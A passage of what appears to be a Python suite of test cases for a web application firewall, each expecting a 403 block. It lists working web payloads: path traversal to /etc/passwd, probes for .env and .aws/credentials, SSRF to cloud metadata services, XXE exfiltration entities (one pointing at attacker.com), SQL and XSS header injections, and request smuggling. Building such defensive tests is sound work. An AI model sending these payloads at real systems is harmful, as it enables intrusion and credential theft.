     ("Path Traversal", f"{TARGET_URL}/..%c0%af..%c0%afetc%c0%afpasswd", "Path Traversal (Level 28) - Mixed UTF-8 Encoding", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/%252e%252e%255cetc%255cpasswd", "Path Traversal (Level 29) - Double Encoded Backslash Mixed", 403, None, None),
    ("Path Traversal", f"{TARGET_URL}/\\..\\..\\etc\\passwd", "Path Traversal (Level 30) - Leading Backslash Path", 403, None, None),

    ("Path Traversal", f"{TARGET_URL}/", "Path Traversal (Header Level 1) - Referer Header", 403, {"Referer": "../../../etc/passwd"}, None),
    ("Path Traversal", f"{TARGET_URL}/", "Path Traversal (Header Level 2) - Custom Header Injection", 403, {"X-File-Path": "../../../etc/passwd"}, None),
     ("Path Traversal", f"{TARGET_URL}/", "Path Traversal (Header Level 3) - X-Forwarded-For Path Traversal", 403, {"X-Forwarded-For": "../../../etc/passwd"}, None),
    ("Path Traversal", f"{TARGET_URL}/", "Path Traversal (Cookie Level 1) - Cookie Injection", 403, {"Cookie": "file=../../../etc/passwd"}, None),
    ("Path Traversal", f"{TARGET_URL}/", "Path Traversal (Cookie Level 2) - Double Encoded Cookie", 403, {"Cookie": "file=%252e%252e%252f%252e%252e%252fetc%252fpasswd"}, None),
    ("Path Traversal", f"{TARGET_URL}/", "Path Traversal (Cookie Level 3) - Cookie with Backslash", 403, {"Cookie": "file=..\\..\\etc\\passwd"}, None),
     ("Path Traversal", f"{TARGET_URL}/", "Path Traversal (Cookie Level 4) - Cookie with Unicode encoding", 403, {"Cookie": "file=..%u2215etc%u2215passwd"}, None),
     ("Path Traversal", f"{TARGET_URL}/", "Path Traversal (Cookie Level 5) - Cookie with UTF-8 encoding", 403, {"Cookie": "file=..%c0%afetc%c0%afpasswd"}, None),

    # Header Injection Tests
    ("Header", f"{TARGET_URL}/", "Header (Level 1) - Basic X-Forwarded-For", 403, {"X-Forwarded-For": "127.0.0.1"}, None),
    ("Header", f"{TARGET_URL}/", "Header (Level 2) - X-Forwarded-For with SQL", 403, {"X-Forwarded-For": "1' OR '1'='1"}, None),
    ("Header", f"{TARGET_URL}/", "Header (Level 3) - X-Forwarded-For with XSS", 403, {"X-Forwarded-For": "<script>alert(1)</script>"}, None),
    ("Header", f"{TARGET_URL}/", "Header (Level 4) - X-Forwarded-For Multiple IPs", 403, {"X-Forwarded-For": "127.0.0.1, example.com"}, None),
    ("Header", f"{TARGET_URL}/", "Header (Level 5) - User-Agent SQL Injection", 403, {"User-Agent": "sqlmap/1.7-dev' OR '1'='1"}, None),
    ("Header", f"{TARGET_URL}/", "Header (Level 6) - Referer Path Traversal", 403, {"Referer": "../../../etc/passwd"}, None),
    ("Header", f"{TARGET_URL}/", "Header (Level 7) - Host Header Spoofing", 403, {"Host": "malicious.domain.com"}, None),
    ("Header", f"{TARGET_URL}/", "Header (Level 8) - Accept-Language SQL", 403, {"Accept-Language": "en-US,sq' OR '1'='1"}, None),
    ("Header", f"{TARGET_URL}/", "Header (Level 9) - Custom Header Injection", 403, {"X-Custom-Attack": "1; DROP TABLE users;"}, None),
    ("Header", f"{TARGET_URL}/", "Header (Level 10) - Content-Type XSS", 403, {"Content-Type": "application/json; charset=<script>alert(1)</script>"}, None),
    ("Header", f"{TARGET_URL}/", "Header (Level 11) - Content-Disposition Injection", 403, {"Content-Disposition": "attachment; filename=\"test.html\r\nContent-Type: text/html\""}, None),
     ("Header", f"{TARGET_URL}/", "Header (Level 12) - Transfer-Encoding Manipulation", 403, {"Transfer-Encoding": "chunked"}, "0\r\n\r\n"),
     ("Header", f"{TARGET_URL}/", "Header (Level 13) - Connection Close", 403, {"Connection": "close"}, None),
    ("Header", f"{TARGET_URL}/", "Header (Level 14) - Upgrade Insecure Requests", 403, {"Upgrade-Insecure-Requests": "1"}, None),
    ("Header", f"{TARGET_URL}/", "Header (Level 15) - X-Original-URL Injection", 403, {"X-Original-URL": "/../../../etc/passwd"}, None),
    ("Header", f"{TARGET_URL}/", "Header (Level 16) - X-Forwarded-Proto Spoofing", 403, {"X-Forwarded-Proto": "https"}, None),
    ("Header", f"{TARGET_URL}/", "Header (Level 17) - X-Real-IP Injection", 403, {"X-Real-IP": "127.0.0.1"}, None),
    ("Header", f"{TARGET_URL}/", "Header (Level 18) - Origin Header Injection", 403, {"Origin": "http://malicious.domain.com"}, None),
    ("Header", f"{TARGET_URL}/", "Header (Level 19) - Cookie Header Injection", 403, {"Cookie": "test=value; malicious=attack"}, None),
     ("Header", f"{TARGET_URL}/", "Header (Level 20) - Accept Header Manipulation", 403, {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8; application/json"}, None),
    ("Header", f"{TARGET_URL}/", "Header (Level 21) - If-Modified-Since Header", 403, {"If-Modified-Since": "Thu, 01 Jan 1970 00:00:00 GMT"}, None),
    ("Header", f"{TARGET_URL}/", "Header (Level 22) - If-Unmodified-Since Header", 403, {"If-Unmodified-Since": "Thu, 01 Jan 1970 00:00:00 GMT"}, None),
     ("Header", f"{TARGET_URL}/", "Header (Level 23) - Max-Forwards Header", 403, {"Max-Forwards": "0"}, None),
     ("Header", f"{TARGET_URL}/", "Header (Level 24) - TE: Trailing Headers", 403, {"Transfer-Encoding": "chunked", "Trailer": "X-Custom-Header"},"0\r\n\r\nX-Custom-Header: malicious"),
   ("Header", f"{TARGET_URL}/", "Header (Level 25) -  Cache-Control Header Manipulation", 403, {"Cache-Control": "no-cache"}, None),
     ("Header", f"{TARGET_URL}/", "Header (Level 26) -  X-HTTP-Method-Override Manipulation", 403, {"X-HTTP-Method-Override": "PUT"}, None),
    ("Header", f"{TARGET_URL}/", "Header (Level 27) - X-Requested-With Injection", 403, {"X-Requested-With": "XMLHttpRequest"}, None),
   ("Header", f"{TARGET_URL}/", "Header (Level 28) -  Proxy-Connection Injection", 403, {"Proxy-Connection": "keep-alive"}, None),
    ("Header", f"{TARGET_URL}/", "Header (Level 29) -  Via Header Injection", 403, {"Via": "1.1 attacker.com"}, None),
    ("Header", f"{TARGET_URL}/", "Header (Level 30) - DNT Header Injection", 403, {"DNT": "1"}, None),
    
    # Protocol-Specific Tests
    ("Protocol", f"{TARGET_URL}/.git/HEAD", "Protocol (Level 1) - .git/HEAD", 403, None, None),
    ("Protocol", f"{TARGET_URL}/.env", "Protocol (Level 2) - .env File", 403, None, None),
    ("Protocol", f"{TARGET_URL}/.htaccess", "Protocol (Level 3) - .htaccess", 403, None, None),
    ("Protocol", f"{TARGET_URL}//.git//HEAD", "Protocol (Level 4) - Obfuscated .git/HEAD", 403, None, None),
    ("Protocol", f"{TARGET_URL}/.svn/entries", "Protocol (Level 5) - .svn/entries", 403, None, None),
    ("Protocol", f"{TARGET_URL}/WEB-INF/web.xml", "Protocol (Level 6) - WEB-INF/web.xml", 403, None, None),
    ("Protocol", f"{TARGET_URL}/config.php.swp", "Protocol (Level 7) - config.php.swp", 403, None, None),
    ("Protocol", f"{TARGET_URL}/.dockerenv", "Protocol (Level 8) - .dockerenv", 403, None, None),
    ("Protocol", f"{TARGET_URL}/server-status", "Protocol (Level 9) - Apache Server Status", 403, None, None),
    ("Protocol", f"{TARGET_URL}/robots.txt", "Protocol (Level 10) - robots.txt (Allowed)", 200, None, None),
    ("Protocol", f"{TARGET_URL}/.aws/credentials", "Protocol (Level 11) - AWS Credentials", 403, None, None),
    ("Protocol", f"{TARGET_URL}/appsettings.json", "Protocol (Level 12) - appsettings.json", 403, None, None),
    ("Protocol", f"{TARGET_URL}/docker-compose.yml", "Protocol (Level 13) - docker-compose.yml", 403, None, None),
    ("Protocol", f"{TARGET_URL}/build.gradle", "Protocol (Level 14) - build.gradle", 403, None, None),
    ("Protocol", f"{TARGET_URL}/pom.xml", "Protocol (Level 15) - pom.xml", 403, None, None),
    ("Protocol", f"{TARGET_URL}/.git/config", "Protocol (Level 16) - .git/config", 403, None, None),
    ("Protocol", f"{TARGET_URL}/.hg/hgrc", "Protocol (Level 17) - .hg/hgrc", 403, None, None),
    ("Protocol", f"{TARGET_URL}/sitemap.xml", "Protocol (Level 18) - sitemap.xml", 403, None, None),
    ("Protocol", f"{TARGET_URL}/crossdomain.xml", "Protocol (Level 19) - crossdomain.xml", 403, None, None),
    ("Protocol", f"{TARGET_URL}/clientaccesspolicy.xml", "Protocol (Level 20) - clientaccesspolicy.xml", 403, None, None),
    ("Protocol", f"{TARGET_URL}/.npmrc", "Protocol (Level 21) - .npmrc File", 403, None, None),
    ("Protocol", f"{TARGET_URL}/composer.lock", "Protocol (Level 22) - composer.lock File", 403, None, None),
    ("Protocol", f"{TARGET_URL}/package.json", "Protocol (Level 23) - package.json File", 403, None, None),
    ("Protocol", f"{TARGET_URL}/.vscode/settings.json", "Protocol (Level 24) - .vscode/settings.json File", 403, None, None),
    ("Protocol", f"{TARGET_URL}/.idea/workspace.xml", "Protocol (Level 25) - .idea/workspace.xml File", 403, None, None),
    ("Protocol", f"{TARGET_URL}/.travis.yml", "Protocol (Level 26) - .travis.yml File", 403, None, None),
     ("Protocol", f"{TARGET_URL}/.gitlab-ci.yml", "Protocol (Level 27) - .gitlab-ci.yml File", 403, None, None),
     ("Protocol", f"{TARGET_URL}/.jenkinsfile", "Protocol (Level 28) - .jenkinsfile File", 403, None, None),
      ("Protocol", f"{TARGET_URL}/.circleci/config.yml", "Protocol (Level 29) - .circleci/config.yml File", 403, None, None),
     ("Protocol", f"{TARGET_URL}/.htpasswd", "Protocol (Level 30) - .htpasswd file", 403, None, None),
    
    # Scanner Detection Tests
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 1) - SQLMap User-Agent", 403, {"User-Agent": "sqlmap/1.7-dev"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 2) - Acunetix User-Agent", 403, {"User-Agent": "acunetix-wvs"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 3) - Nikto User-Agent", 403, {"User-Agent": "Nikto/2.1.5"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 4) - Nmap User-Agent", 403, {"User-Agent": "Mozilla/5.0 Nmap"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 5) - Burp Suite User-Agent", 403, {"User-Agent": "Mozilla/5.0 (compatible; BurpSuite/2023.10.1)"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 6) - OWASP ZAP User-Agent", 403, {"User-Agent": "OWASP ZAP/2.12.0"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 7) - Nessus User-Agent", 403, {"User-Agent": "Nessus/10.7.0"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 8) - Qualys User-Agent", 403, {"User-Agent": "QualysAgent/1.0"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 9) - Wfuzz User-Agent", 403, {"User-Agent": "Wfuzz/2.4.2"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 10) - OpenVAS User-Agent", 403, {"User-Agent": "OpenVAS"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 11) - Skipfish User-Agent", 403, {"User-Agent": "Skipfish/2.16b"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 12) - Arachni User-Agent", 403, {"User-Agent": "Arachni/v2.4"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 13) - Vega User-Agent", 403, {"User-Agent": "Vega"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 14) - Skipfish Generic", 403, {"User-Agent": "Mozilla/5.0 (compatible; NoName/1.0; +http://example.com)"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 15) - WPScan User-Agent", 403, {"User-Agent": "WPScan"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 16) - DirBuster User-Agent", 403, {"User-Agent": "DirBuster"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 17) - GoSpider User-Agent", 403, {"User-Agent": "Go-http-client"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 18) - GxSpider User-Agent", 403, {"User-Agent": "GxSpider"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 19) - GoBuster User-Agent", 403, {"User-Agent": "gobuster"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 20) - WhatWeb User-Agent", 403, {"User-Agent": "WhatWeb"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 21) - XSpider User-Agent", 403, {"User-Agent": "XSpider"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 22) - Vega Scanner Generic", 403, {"User-Agent": "Mozilla/5.0 (compatible; vega/1.0)"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 23) -  Netsparker User-Agent", 403, {"User-Agent": "Netsparker"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 24) -  WebInspect User-Agent", 403, {"User-Agent": "WebInspect"}, None),
     ("Scanner", f"{TARGET_URL}/", "Scanner (Level 25) -  AppSpider User-Agent", 403, {"User-Agent": "AppSpider"}, None),
     ("Scanner", f"{TARGET_URL}/", "Scanner (Level 26) -  W3af User-Agent", 403, {"User-Agent": "w3af"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 27) -  Arachni Generic", 403, {"User-Agent": "Mozilla/5.0 (compatible; arachni/1.0)"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 28) -  Joomscan User-Agent", 403, {"User-Agent": "Joomscan"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 29) -  Uniscan User-Agent", 403, {"User-Agent": "Uniscan"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 30) -  BlindElephant User-Agent", 403, {"User-Agent": "BlindElephant"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 31) -  Vega with custom header", 403, {"User-Agent": "Vega", "X-Custom-Header":"test"}, None),
    ("Scanner", f"{TARGET_URL}/", "Scanner (Level 32) -  BurpSuite with custom header", 403, {"User-Agent": "Mozilla/5.0 (compatible; BurpSuite/2023.10.1)", "X-Custom-Header":"test"}, None),

    # Insecure Deserialization Tests
    ("Insecure Deserialization", f"{TARGET_URL}/?data=rO0AB...", "Insecure Deserialization (Level 1) - Java Serialized", 403, None, None),
    ("Insecure Deserialization", f"{TARGET_URL}/?data=YJv...base64...", "Insecure Deserialization (Level 2) - Python Pickle", 403, None, None),
    ("Insecure Deserialization", f"{TARGET_URL}/?data=Tzo...base64...", "Insecure Deserialization (Level 3) - PHP Object", 403, None, None),
     ("Insecure Deserialization", f"{TARGET_URL}/?data=eyJ0eXBlIjoib2JqZWN0Ii4uLn0=", "Insecure Deserialization (Level 4) - JSON Object", 403, None, None),
    ("Insecure Deserialization", f"{TARGET_URL}/?data=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48b2JqZWN0Pi4uLjwvb2JqZWN0Pg==", "Insecure Deserialization (Level 5) - XML Object", 403, None, None),
     ("Insecure Deserialization", f"{TARGET_URL}/?data=YmluYXJ5IGRhdGEuLi4=", "Insecure Deserialization (Level 6) - Binary Data", 403, None, None),
     ("Insecure Deserialization", f"{TARGET_URL}/?data=aW50ID0gMTA7", "Insecure Deserialization (Level 7) - Python Code", 403, None, None),
    ("Insecure Deserialization", f"{TARGET_URL}/", "Insecure Deserialization (Header Level 1) - Serialized in Header", 403, {"X-Serialized-Data": "rO0AB..."}, None),
    ("Insecure Deserialization", f"{TARGET_URL}/", "Insecure Deserialization (Header Level 2) - Python Pickle in Header", 403, {"X-Serialized-Data": "YJv...base64..."}, None),
    ("Insecure Deserialization", f"{TARGET_URL}/", "Insecure Deserialization (Header Level 3) - PHP Object in Header", 403, {"X-Serialized-Data": "Tzo...base64..."}, None),
     ("Insecure Deserialization", f"{TARGET_URL}/", "Insecure Deserialization (Header Level 4) - JSON in Header", 403, {"X-Serialized-Data": "eyJ0eXBlIjoib2JqZWN0Ii4uLn0="}, None),
    ("Insecure Deserialization", f"{TARGET_URL}/", "Insecure Deserialization (Header Level 5) - XML in Header", 403, {"X-Serialized-Data": "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48b2JqZWN0Pi4uLjwvb2JqZWN0Pg=="}, None),
    ("Insecure Deserialization", f"{TARGET_URL}/", "Insecure Deserialization (Cookie Level 1) - Serialized in Cookie", 403, {"Cookie": "session=rO0AB..."}, None),
    ("Insecure Deserialization", f"{TARGET_URL}/", "Insecure Deserialization (Cookie Level 2) - JSON in Cookie", 403, {"Cookie": "session={\"type\":\"object\"...}"}, None),
    ("Insecure Deserialization", f"{TARGET_URL}/", "Insecure Deserialization (Cookie Level 3) - PHP Object in Cookie", 403, {"Cookie": "session=Tzo...base64..."}, None),
   ("Insecure Deserialization", f"{TARGET_URL}/", "Insecure Deserialization (Cookie Level 4) - Base64 Encoded String in Cookie", 403, {"Cookie": "session=aW50ID0gMTA7"}, None),
     ("Insecure Deserialization", f"{TARGET_URL}/", "Insecure Deserialization (Cookie Level 5) - Binary Data in Cookie", 403, {"Cookie": "session=YmluYXJ5IGRhdGEuLi4="}, None),
   
    # Server-Side Request Forgery (SSRF) Tests
    ("SSRF", f"{TARGET_URL}/?url=http://127.0.0.1", "SSRF (Level 1) - Basic Internal Request", 403, None, None),
    ("SSRF", f"{TARGET_URL}/?url=file:///etc/passwd", "SSRF (Level 2) - File Protocol", 403, None, None),
    ("SSRF", f"{TARGET_URL}/?url=http://example.com", "SSRF (Level 3) - Outbound Request", 403, None, None),
    ("SSRF", f"{TARGET_URL}/?url=http://127.0.0.1:8080", "SSRF (Level 4) - Internal Request with Port", 403, None, None),
    ("SSRF", f"{TARGET_URL}/?url=https://127.0.0.1", "SSRF (Level 5) - HTTPS Internal Request", 403, None, None),
     ("SSRF", f"{TARGET_URL}/?url=ftp://127.0.0.1", "SSRF (Level 6) - FTP Protocol", 403, None, None),
    ("SSRF", f"{TARGET_URL}/?url=gopher://127.0.0.1", "SSRF (Level 7) - Gopher Protocol", 403, None, None),
    ("SSRF", f"{TARGET_URL}/?url=dict://127.0.0.1:11211", "SSRF (Level 8) - Dict Protocol", 403, None, None),
    ("SSRF", f"{TARGET_URL}/?url=ldap://127.0.0.1", "SSRF (Level 9) - LDAP Protocol", 403, None, None),
    ("SSRF", f"{TARGET_URL}/?url=tftp://127.0.0.1", "SSRF (Level 10) - TFTP Protocol", 403, None, None),
    ("SSRF", f"{TARGET_URL}/?url=http://[::1]", "SSRF (Level 11) - IPv6 Localhost", 403, None, None),
    ("SSRF", f"{TARGET_URL}/?url=http://0", "SSRF (Level 12) - Integer IP Address", 403, None, None),
    ("SSRF", f"{TARGET_URL}/?url=http://127.1", "SSRF (Level 13) - Shortened IP Address", 403, None, None),
    ("SSRF", f"{TARGET_URL}/?url=https://example.com@127.0.0.1", "SSRF (Level 14) - Credential in URL", 403, None, None),
     ("SSRF", f"{TARGET_URL}/?url=http://169.254.169.254", "SSRF (Level 15) - AWS Metadata Service", 403, None, None),
    ("SSRF", f"{TARGET_URL}/?url=http://metadata.google.internal/", "SSRF (Level 16) - Google Cloud Metadata Service", 403, None, None),
    ("SSRF", f"{TARGET_URL}/?url=http://100.100.100.200/latest/meta-data/", "SSRF (Level 17) - Digital Ocean Metadata Service", 403, None, None),
   ("SSRF", f"{TARGET_URL}/?url=http://localhost", "SSRF (Level 18) -  Localhost Request", 403, None, None),
    ("SSRF", f"{TARGET_URL}/?url=http://127.0.0.1#fragment", "SSRF (Level 19) - Fragment Identifier", 403, None, None),
   ("SSRF", f"{TARGET_URL}/?url=http://127.0.0.1/path/../..", "SSRF (Level 20) - Path Traversal in URL", 403, None, None),
    ("SSRF", f"{TARGET_URL}/", "SSRF (Header Level 1) - URL in Header", 403, {"X-Forwarded-Host": "http://127.0.0.1"}, None),
    ("SSRF", f"{TARGET_URL}/", "SSRF (Header Level 2) - Custom Header SSRF", 403, {"X-Custom-URL": "file:///etc/passwd"}, None),
    ("SSRF", f"{TARGET_URL}/", "SSRF (Header Level 3) - X-Forwarded-For SSRF", 403, {"X-Forwarded-For": "http://127.0.0.1"}, None),
    ("SSRF", f"{TARGET_URL}/", "SSRF (Header Level 4) - Referer SSRF", 403, {"Referer": "http://127.0.0.1"}, None),
    ("SSRF", f"{TARGET_URL}/", "SSRF (Header Level 5) - Origin SSRF", 403, {"Origin": "http://127.0.0.1"}, None),
    ("SSRF", f"{TARGET_URL}/", "SSRF (Cookie Level 1) - URL in Cookie", 403, {"Cookie": "ssrf_url=http://127.0.0.1"}, None),
    ("SSRF", f"{TARGET_URL}/", "SSRF (Cookie Level 2) - File Protocol in Cookie", 403, {"Cookie": "ssrf_url=file:///etc/passwd"}, None),
    ("SSRF", f"{TARGET_URL}/", "SSRF (Cookie Level 3) - URL with Credential in Cookie", 403, {"Cookie": "ssrf_url=https://user:pass@127.0.0.1"}, None),
    ("SSRF", f"{TARGET_URL}/", "SSRF (Cookie Level 4) - URL with path traversal in Cookie", 403, {"Cookie": "ssrf_url=http://127.0.0.1/../../etc/passwd"}, None),
      ("SSRF", f"{TARGET_URL}/", "SSRF (Cookie Level 5) - URL with IPv6 in Cookie", 403, {"Cookie": "ssrf_url=http://[::1]"}, None),
  

    # XML External Entity (XXE) Injection Tests
    ("XXE", f"{TARGET_URL}/?xml=<xml><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo></xml>", "XXE (Level 1) - Basic XXE", 403, None, None),
    ("XXE", f"{TARGET_URL}/?xml=<xml><!DOCTYPE doc [<!ENTITY xxe SYSTEM \"http://127.0.0.1\">]><doc>&xxe;</doc></xml>", "XXE (Level 2) - External DTD", 403, None, None),
    ("XXE", f"{TARGET_URL}/?xml=<!DOCTYPE data [<!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % eval \"<!ENTITY % exfil SYSTEM 'http://127.0.0.1/?data=%file;'>\">%eval;]><data>&exfil;</data>", "XXE (Level 3) - Parameter Entity", 403, None, None),
     ("XXE", f"{TARGET_URL}/?xml=<!DOCTYPE data [<!ENTITY % file SYSTEM 'php://filter/read=convert.base64-encode/resource=/etc/passwd;'>%file;]>", "XXE (Level 4) - PHP Filter", 403, None, None),
     ("XXE", f"{TARGET_URL}/?xml=<!DOCTYPE data [<!ENTITY % file SYSTEM \"file:///dev/random\"> <!ENTITY % eval \"<!ENTITY % exfil SYSTEM 'http://127.0.0.1/?data=%file;'>\">%eval;]><data>&exfil;</data>", "XXE (Level 5) - Read From Dev Random", 403, None, None),
    ("XXE", f"{TARGET_URL}/?xml=<!DOCTYPE data [<!ENTITY % param1 SYSTEM \"file:///etc/passwd\">]><data>¶m1;</data>", "XXE (Level 6) - Parameter Entity", 403, None, None),
    ("XXE", f"{TARGET_URL}/?xml=<!DOCTYPE foo [<!ENTITY % remote SYSTEM 'http://attacker.com/evil.dtd'>%remote;]><bar>&exfil;</bar>", "XXE (Level 7) - Remote DTD with Parameter Entity", 403, None, None),
    ("XXE", f"{TARGET_URL}/", "XXE (Header Level 1) - XML in Header", 403, {"Content-Type": "application/xml"}, "<xml><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo></xml>"),
    ("XXE", f"{TARGET_URL}/", "XXE (Header Level 2) - External Entity in Header", 403, {"Content-Type": "application/xml"}, "<xml><!DOCTYPE doc [<!ENTITY xxe SYSTEM \"http://127.0.0.1\">]><doc>&xxe;</doc></xml>"),
    ("XXE", f"{TARGET_URL}/", "XXE (Header Level 3) - SVG in Header", 403, {"Content-Type": "image/svg+xml"}, "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.0//EN\" \"http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd\"[<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg><text>&xxe;</text></svg>"),
    ("XXE", f"{TARGET_URL}/", "XXE (Header Level 4) -  DTD in Header", 403, {"Content-Type": "text/xml"}, "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"),
      ("XXE", f"{TARGET_URL}/", "XXE (Header Level 5) - Custom header with XML", 403, {"X-Custom-XML": "<xml><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo></xml>"}, None),
    ("XXE", f"{TARGET_URL}/", "XXE (Body Level 1) - XML in Body", 403, None, "<xml><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo></xml>"),
    ("XXE", f"{TARGET_URL}/", "XXE (Body Level 2) - Parameter entity in Body", 403, None, "<xml><!DOCTYPE data [<!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % eval \"<!ENTITY % exfil SYSTEM 'http://127.0.0.1/?data=%file;'>\">%eval;]><data>&exfil;</data></xml>"),
    ("XXE", f"{TARGET_URL}/", "XXE (Body Level 3) - SVG in Body", 403, None, "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.0//EN\" \"http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd\"[<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg><text>&xxe;</text></svg>"),
     ("XXE", f"{TARGET_URL}/", "XXE (Body Level 4) - DTD in Body", 403, None, "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"),
     ("XXE", f"{TARGET_URL}/", "XXE (Body Level 5) -  Base64 Encoded data", 403, None, '<xml><!DOCTYPE data [<!ENTITY % file SYSTEM \'php://filter/read=convert.base64-encode/resource=/etc/passwd;\'> %file;]> <data>&file;</data></xml>'),

    # HTTP Request Smuggling
    ("HTTP Request Smuggling", f"{TARGET_URL}/", "HTTP Request Smuggling (Level 1) - CL.TE", 403, {"Transfer-Encoding": "chunked", "Content-Length": "10"}, "0\r\n\r\n"),
    ("HTTP Request Smuggling", f"{TARGET_URL}/", "HTTP Request Smuggling (Level 2) - TE.CL", 403, {"Transfer-Encoding": "chunked", "Content-Length": "10"}, "0\r\n\r\n"),
     ("HTTP Request Smuggling", f"{TARGET_URL}/", "HTTP Request Smuggling (Level 3) - CL.TE with Extra Headers", 403, {"Transfer-Encoding": "chunked", "Content-Length": "10", "X-Extra-Header":"test"}, "0\r\n\r\n"),
    ("HTTP Request Smuggling", f"{TARGET_URL}/", "HTTP Request Smuggling (Level 4) - TE: chunked, TE: identity", 403, {"Transfer-Encoding": "chunked, identity"}, "0\r\n\r\n"),
    ("HTTP Request Smuggling", f"{TARGET_URL}/", "HTTP Request Smuggling (Level 5) - Obfuscated TE", 403, {"Transfer-Encoding ": "chunked"}, "0\r\n\r\n"),
    ("HTTP Request Smuggling", f"{TARGET_URL}/", "HTTP Request Smuggling (Level 6) -  Content-Length: 0", 403, {"Content-Length": "0"}, None),
    ("HTTP Request Smuggling", f"{TARGET_URL}/", "HTTP Request Smuggling (Level 7) - TE: chunked, Content-Length: 10, data after chunk", 403, {"Transfer-Encoding": "chunked", "Content-Length": "10"}, "0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 5\r\n\r\ndata"),
    ("HTTP Request Smuggling", f"{TARGET_URL}/", "HTTP Request Smuggling (Level 8) - TE: chunked, invalid chunk size", 403, {"Transfer-Encoding": "chunked"}, "invalid-chunk\r\n\r\n"),
    ("HTTP Request Smuggling", f"{TARGET_URL}/", "HTTP Request Smuggling (Level 9) - TE: chunked, no data chunk", 403, {"Transfer-Encoding": "chunked"}, "\r\n"),
   ("HTTP Request Smuggling", f"{TARGET_URL}/", "HTTP Request Smuggling (Level 10) - TE: chunked,  trailing headers", 403, {"Transfer-Encoding": "chunked", "Trailer": "X-Custom-Header"}, "0\r\n\r\nX-Custom-Header: malicious"),
    ("HTTP Request Smuggling", f"{TARGET_URL}/", "HTTP Request Smuggling (Header Level 1) - CL.TE in Header", 403, {"Transfer-Encoding": "chunked", "Content-Length": "10", "X-Custom-Data": "0\r\n\r\n"}, None),
    ("HTTP Request Smuggling", f"{TARGET_URL}/", "HTTP Request Smuggling (Header Level 2) - TE.CL in Header", 403, {"Transfer-Encoding": "chunked", "Content-Length": "10", "X-Custom-Data": "0\r\n\r\n"}, None),
    ("HTTP Request Smuggling", f"{TARGET_URL}/", "HTTP Request Smuggling (Body Level 1) - CL.TE in Body", 403, None, "0\r\n\r\n"),
    ("HTTP Request Smuggling", f"{TARGET_URL}/", "HTTP Request Smuggling (Body Level 2) - TE.CL in Body", 403, None, "0\r\n\r\n"),
    ("HTTP Request Smuggling", f"{TARGET_URL}/", "HTTP Request Smuggling (Body Level 3) - Extra Content", 403, None, "0\r\n\r\nPOST / HTTP/1.1\r\nHost: target\r\nContent-Length: 10\r\n\r\ndata"),
    ("HTTP Request Smuggling", f"{TARGET_URL}/", "HTTP Request Smuggling (Body Level 4) - Extra chunk data", 403, None, "5\r\ndata\r\n0\r\n\r\n"),
    ("HTTP Request Smuggling", f"{TARGET_URL}/", "HTTP Request Smuggling (Body Level 5) - Extra Content with cl-0", 403, {"Content-Length":"0"},"POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 10\r\n\r\ndata"),
    

    # HTTP Response Splitting
    ("HTTP Response Splitting", f"{TARGET_URL}/?header=X-Custom-Header: malicious\r\nContent-Type: text/html", "HTTP Response Splitting (Level 1) - Basic Header Injection", 403, None, None),
    ("HTTP Response Splitting", f"{TARGET_URL}/?header=X-Custom-Header: malicious%0d%0aContent-Type: text/html", "HTTP Response Splitting (Level 2) - CRLF Injection", 403, None, None),
